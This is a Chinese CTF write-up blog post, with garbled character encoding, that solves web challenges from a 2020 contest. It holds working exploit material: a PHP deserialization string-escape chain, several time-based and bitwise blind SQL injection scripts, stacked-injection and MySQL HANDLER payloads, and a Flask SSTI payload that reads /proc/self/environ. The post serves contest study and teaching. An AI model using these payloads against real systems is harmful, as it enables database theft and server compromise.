<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200224124618322.png" alt="image-20200224124618322"></p>
<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>è¿™é¢˜å°±ä¸ç”¨è¯´äº†ï¼Œå•¥è¿‡æ»¤éƒ½æ²¡æœ‰ã€‚</p>
<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>æ‰«ç›®å½•æœ‰<a href="http://www.zipï¼Œçœ‹åˆ°" target="_blank" rel="noopener">www.zipï¼Œçœ‹åˆ°</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset="utf-8"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰ç”¨dieç”¨çš„echoï¼Œä¹‹åçš„ç¨‹åºè¿˜ä¼šæ‰§è¡Œï¼Œè€Œä¸”</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>safeå‡½æ•°è¿˜ä¼šæ”¹å˜åºåˆ—åŒ–åçš„å€¼ï¼Œå¦‚æœåºåˆ—åŒ–å†…å®¹æœ‰æ•°ç»„é‡Œçš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆåºåˆ—åŒ–åçš„å€¼å°±ä¼šå˜é•¿ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç‚¹å’Œphpååºåˆ—åŒ–çš„å®¹é”™æ€§æ¥æ„é€ ååºåˆ—åŒ–é“¾ï¼Œ</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200222162442935.png" alt="image-20200222162442935"></p>
<p>é€šè¿‡ååºåˆ—åŒ–æœ€åè§¦å‘login()ï¼Œè¿”å›adminçš„å¯†ç ï¼Œç™»å½•å¾—åˆ°flagã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">	<span class="keyword">public</span> $password = <span class="string">"admin"</span>;</span><br><span class="line">	<span class="keyword">public</span> $mysqli;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $id;</span><br><span class="line">	<span class="keyword">public</span> $newinfo;</span><br><span class="line">	<span class="keyword">public</span> $sql;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo, $sql)</span> </span>&#123;</span><br><span class="line">		$newInfo = unserialize($newInfo);</span><br><span class="line">		$upDate = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $age;</span><br><span class="line">	<span class="keyword">public</span> $nickname;</span><br><span class="line">	<span class="keyword">public</span> $CtrlCase;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age, $nickname)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;nickname = $nickname;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $argument)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//echo $argument[0];</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $id = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">public</span> $age = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">public</span> $nickname;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname); <span class="comment">//å±</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">$i1 = <span class="keyword">new</span> Info(<span class="string">"23"</span>,<span class="string">"ddd"</span>);</span><br><span class="line">$i1-&gt;CtrlCase=$user;</span><br><span class="line">$n=<span class="keyword">new</span> User();</span><br><span class="line">$n-&gt;nickname=$i1;</span><br><span class="line">$n-&gt;age=<span class="string">'select "1", "21232f297a57a5a743894a0e4a801fc3"'</span>;</span><br><span class="line">$up=<span class="keyword">new</span> UpdateHelper(<span class="keyword">NULL</span>,<span class="string">"ddd"</span>);</span><br><span class="line">$up-&gt;sql=$n;</span><br><span class="line">$i = <span class="keyword">new</span> Info(<span class="string">"23"</span>,$up);</span><br><span class="line"><span class="keyword">echo</span> serialize($i);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;23&quot;;s:8:&quot;nickname&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;i:2;s:3:&quot;age&quot;;s:46:&quot;select &quot;1&quot;, &quot;21232f297a57a5a743894a0e4a801fc3&quot;&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;23&quot;;s:8:&quot;nickname&quot;;s:3:&quot;ddd&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å°±æ˜¯è®¡ç®—äº†ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;s:8:&quot;nickname&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;i:2;s:3:&quot;age&quot;;s:46:&quot;select &quot;1&quot;, &quot;21232f297a57a5a743894a0e4a801fc3&quot;&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;23&quot;;s:8:&quot;nickname&quot;;s:3:&quot;ddd&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;s:8:&quot;CtrlCase&quot;;N;&#125; </span><br><span class="line">è¿™æ®µé•¿åº¦æ˜¯373</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åŠ ä¸€ä¸ª<code>*</code>æ›¿æ¢æˆ<code>hacker</code>åå°±ä¼šå¤š5ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥è¦æ·»åŠ 74ä¸ª<code>*</code>åŠ 1ä¸ª<code>into</code>åŠ 1ä¸ª<code>union</code>æ­£å¥½<code>74*5+1*2+1*1=373</code>ã€‚</p>
<p>åœ¨æœ¬åœ°è°ƒè¯•çš„æ—¶å€™</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200223095156234.png" alt="image-20200223095156234"></p>
<p>è°·æ­Œä¸€ä¸‹æ˜¯å› ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:455:&quot;**************************************************************************unioninto&quot;;s:8:&quot;nicknami&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;i:2;s:3:&quot;age&quot;;s:46:&quot;select &quot;1&quot;, &quot;21232f297a57a5a743894a0e4a801fc3&quot;&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:2:&quot;23&quot;;s:8:&quot;nickname&quot;;s:3:&quot;ddd&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;admin&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;s:8:&quot;CtrlCase&quot;;N;&#125;&quot;;s:8:&quot;nickname&quot;;s:4:&quot;dddd&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„$nicknameæ˜¯ä¸€ä¸ªObject,æ‰€ä»¥æŠ¥é”™ï¼Œæˆ‘ä»¬æŠŠpayloadä¸­çš„nicknameæ”¹ä¸ºåŒé•¿åº¦çš„å…¶ä»–å˜é‡åå³å¯ã€‚</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200223231606959.png" alt="image-20200223231606959"></p>
<h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><p>è¿‡æ»¤äº†<code>select = &gt; &lt;</code>ç­‰ã€‚ </p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">url=<span class="string">"http://b2aa87e875e24d8594bc523bf9ca972ed4b62c6107cb493d.changame.ichunqiu.com/?id="</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">dic=<span class="string">"qwertyuiopasdfghjklzxcvbnm1234567890&#123;&#125;-"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">	<span class="keyword">for</span> mid <span class="keyword">in</span> dic:</span><br><span class="line">		payload=<span class="string">r"if(ascii(substr(fl4g,&#123;&#125;,1))%20regexp%20&#123;&#125;,sleep(2),0)"</span></span><br><span class="line">		url_1=url+payload.format(i,ord(mid))</span><br><span class="line">		print(payload.format(i,ord(mid)))</span><br><span class="line">		start_time=time.time()</span><br><span class="line">		r=requests.get(url_1)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">		end_time=time.time()</span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> end_time-start_time&gt;=<span class="number">2</span>:</span><br><span class="line">			flag+=mid</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day_2"></a>Day_2</h2><h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><p>è€ƒç‚¹ï¼šå †å æ³¨å…¥</p>
<p>æ‰“å¼€é¢˜ç›®ç»™äº†æºç ï¼Œ</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200222150130260.png" alt="image-20200222150130260"></p>
<p>è¿™é‡Œè¯´ä¸€ä¸‹sqlçš„é¢„ç¼–è¯‘å’Œæ¨¡æ‹Ÿé¢„ç¼–è¯‘ï¼Œ</p>
<ul>
<li><p>é‡‡ç”¨é¢„ç¼–è¯‘æ—¶ï¼Œä¼šå…ˆå°†å¾…æ‰§è¡Œçš„sqlè¯­å¥ä¸­çš„å‚æ•°å€¼ç”¨å ä½ç¬¦æ¥æ›¿ä»£ï¼Œå½“æœ‰å ä½ç¬¦çš„sqlè¯­å¥æ¨¡æ¿è¢«æ•°æ®åº“ç¼–è¯‘ã€è§£æåï¼Œå†é€šè¿‡å‘å ä½ç¬¦ç»‘å®šå‚æ•°è¿›è¡ŒæŸ¥è¯¢æ“ä½œã€‚è¿™æ ·ä¹Ÿæ¥ï¼Œå‘æ¨¡æ¿ä¸­ä¼ å…¥çš„è¾“å…¥å€¼ï¼Œéƒ½ä¼šè¢«å½“æˆå­—ç¬¦ä¸²ï¼Œå¯ä»¥æœç»sqlæ³¨å…¥çš„äº§ç”Ÿã€‚</p>
<p>é¢„åˆ¶è¯­å¥çš„SQLè¯­æ³•åŸºäºä¸‰ä¸ªSQLè¯­å¥ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">prepare</span> stmt_name <span class="keyword">from</span> preparable_stmt;</span><br><span class="line"><span class="keyword">execute</span> stmt_name [<span class="keyword">using</span> @var_name [, @var_name] ...];</span><br><span class="line">&#123;deallocate | drop&#125; prepare stmt_name;</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ¨¡æ‹Ÿé¢„ç¼–è¯‘æ˜¯ä¸ºäº†ä¸€äº›ä¸æ”¯æŒé¢„ç¼–è¯‘çš„æ•°æ®åº“è®¾ç½®çš„ï¼Œå®¢æˆ·ç«¯ç¨‹åºå†…éƒ¨æ¨¡æ‹Ÿsqlæ•°æ®åº“ä¸­å‚æ•°ç»‘å®šçš„è¿‡ç¨‹ã€‚</p>
</li>
</ul>
<p>PDOåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯å…è®¸å¤šå¥æ‰§è¡Œå’Œæ¨¡æ‹Ÿé¢„ç¼–è¯‘çš„ï¼Œé¢˜ç›®æºç ä¸­åœ¨å£°æ˜PDOå®ä¾‹çš„æ—¶å€™æ²¡æœ‰æŒ‡å®šä¸å…è®¸å¤šè¯­å¥æ‰§è¡Œï¼Œä¸å…è®¸æ¨¡æ‹Ÿé¢„ç¼–è¯‘ã€‚æ‰€ä»¥è¿™é“é¢˜å¯ä»¥é€šè¿‡å †å æ³¨å…¥è§£ã€‚</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">password=<span class="string">""</span></span><br><span class="line">url = <span class="string">"http://a6f0af74cb42409c8b829fdba30975255144c88cd6c54dd0.changame.ichunqiu.com/?id"</span></span><br><span class="line">string = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;-,"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        s = j.encode(<span class="string">'hex'</span>)</span><br><span class="line">        yuju=<span class="string">"select sleep(3*(ascii(mid((select fllllll4g from table1),&#123;&#125;,1))=&#123;&#125;));"</span></span><br><span class="line">        yuju=yuju.format(i,ord(j))</span><br><span class="line">        payload=<span class="string">"=0%df' ;SET%20@SQL=0x&#123;&#125;;PREPARE exesql FROM @SQL;EXECUTE exesql;"</span>.format(yuju.encode(<span class="string">"hex"</span>))</span><br><span class="line">        <span class="comment">#print data</span></span><br><span class="line">        st_time=time.time()</span><br><span class="line">        r = requests.get(url+payload)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">        e_time=time.time()</span><br><span class="line">        <span class="comment">#print r.text</span></span><br><span class="line">        <span class="keyword">if</span> e_time-st_time &gt;=<span class="number">3</span>:</span><br><span class="line">			password = password + j</span><br><span class="line">			<span class="keyword">print</span> password</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="comment">#fllllll4g</span></span><br></pre></td></tr></table></figure>

<p>æ€»ç»“ä¸€ä¸‹å¯ä»¥å †å æ³¨å…¥çš„åœºæ™¯</p>
<ul>
<li>Mysqliçš„multi_query()</li>
<li>PDOé»˜è®¤æƒ…å†µä¸‹çš„query()</li>
</ul>
<p>å‚è€ƒé“¾æ¥</p>
<p><a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">ä»å®½å­—èŠ‚æ³¨å…¥è®¤è¯†PDOçš„åŸç†å’Œæ­£ç¡®ä½¿ç”¨</a></p>
<p><a href="https://xz.aliyun.com/t/3950" target="_blank" rel="noopener">https://xz.aliyun.com/t/3950</a></p>
<p><a href="https://xz.aliyun.com/t/7132" target="_blank" rel="noopener">https://xz.aliyun.com/t/7132</a></p>
<h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><p>è€ƒç‚¹ ï¼šmysqlæ–°ç‰¹æ€§handler</p>
<p>æ‰“å¼€é¢˜ç›®ï¼Œç•Œé¢å’Œå¼ºç½‘æ¯çš„éšä¾¿æ³¨ç•Œé¢ç±»ä¼¼ï¼Œä½†æ˜¯è¿‡æ»¤äº† setã€prepareç­‰å­—æ®µã€‚æ‰€ä»¥éœ€è¦é‡‡ç”¨æ–°çš„æ–¹æ³•æ¥ç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>

<p>ä¹‹å‰çœ‹ä¸€å¶é£˜é›¶å¸ˆå‚…çš„åšå®¢é‡Œçš„FudanCTFæŸé“é¢˜æ—¶ï¼Œé‡Œé¢ç”¨äº†handlerè¿™ä¸ªæ–°ç‰¹æ€§ï¼š</p>
<p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] <span class="keyword">alias</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> | PREV | <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200222154705385.png" alt="image-20200222154705385"></p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inject&#x3D;0%27;show%20tables;</span><br><span class="line">inject&#x3D;0%27;handler%20&#96;FlagHere&#96;%20open%20as%20&#96;ss&#96;;handler%20&#96;ss&#96;%20read%20next;</span><br></pre></td></tr></table></figure>

<h3 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h3><p>è€ƒç‚¹  ï¼šsys.schema_table_statistics_with_bufferæŸ¥åˆ—å  æ— åˆ—åæŒ‰ä½çˆ†ç ´å­—æ®µã€‚</p>
<p>è¿‡æ»¤äº† in æ‰€ä»¥å¸¸è§„æ–¹æ³•æŸ¥è¡¨åï¼Œåˆ—åéƒ½ä¸å¯ä»¥äº†ã€‚ç”¨sys.schema_table_statistics_with_bufferæ¥æŸ¥ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">password=<span class="string">""</span></span><br><span class="line">url = <span class="string">"http://42b9a14929e64c8daf5f5f5a9380b26366da480841da49c6.changame.ichunqiu.com/"</span></span><br><span class="line">string = <span class="string">",0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;-,abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        payload=<span class="string">"ascii(mid((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))-&#123;&#125;"</span>.format(i,j)</span><br><span class="line">        data=&#123;<span class="string">"id"</span>:payload&#125;</span><br><span class="line">        r = requests.post(url,data=data)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">" Nu1L"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">			password = password + chr(j+<span class="number">1</span>)</span><br><span class="line">			<span class="keyword">print</span> password</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>ä¸çŸ¥é“åˆ—åï¼Œç”¨æ— åˆ—åæ³¨å…¥ï¼Œæœ‰è¿‡æ»¤äº†union select ,æ€ä¹ˆè¯•éƒ½æ²¡ç»•è¿‡ã€‚ç„¶åç¿»å¤§ä½¬çš„åšå®¢ï¼Œçœ‹åˆ°æŒ‰ä½çˆ†ç ´æ–¹æ³•ã€‚å‚è€ƒé“¾æ¥ï¼Œä½†æ˜¯æ–‡ä¸­çš„æ–¹æ³•åœ¨æœ¬é¢˜æœ‰ç‚¹é—®é¢˜ï¼Œéœ€è¦è¾¹ä¿®æ”¹è¾¹è·‘ï¼Œè¿˜å¯ä»¥ç”¨åå…­è¿›åˆ¶æ¥çˆ†ç ´ï¼Œè¿™é‡Œè´´ä¸€ä¸‹åå…­è¿›åˆ¶çˆ†ç ´çš„è„šæœ¬ã€‚</p>
<p><img src="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/image-20200222230548963.png" alt="image-20200222230548963"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">url = <span class="string">"http://af4fcae52ce5463583151b28d2d6921e2843633f7f304a41.changame.ichunqiu.com/"</span></span><br><span class="line">string = <span class="string">"a-0123456789abcdefghijklmnopqrestuvwxyz_&#123;&#125;~"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">44</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">"ascii((select (select 1,0x&#123;&#125;)&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1)))-48"</span>.format(password+chr(j).encode(<span class="string">"hex"</span>))</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        data=&#123;<span class="string">"id"</span>:payload&#125;</span><br><span class="line">        r = requests.post(url,data=data,proxies=proxies)</span><br><span class="line">        <span class="keyword">print</span> r.status_code</span><br><span class="line">        <span class="keyword">if</span> <span class="string">" Nu1L"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            password = password + chr(j<span class="number">-1</span>).encode(<span class="string">"hex"</span>)</span><br><span class="line">            <span class="keyword">print</span> password</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="Day-3"><a href="#Day-3" class="headerlink" title="Day_3"></a>Day_3</h2><h3 id="Flask-app"><a href="#Flask-app" class="headerlink" title="Flask_app"></a>Flask_app</h3><p>è€ƒç‚¹ï¼šflask ssti  , è®¡ç®—pinç </p>
<p>é¢˜ç›®ç¯å¢ƒæ˜¯python3 ,ssti payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥è¯»æ–‡ä»¶ï¼Œä¾æ¬¡è¯»</p>
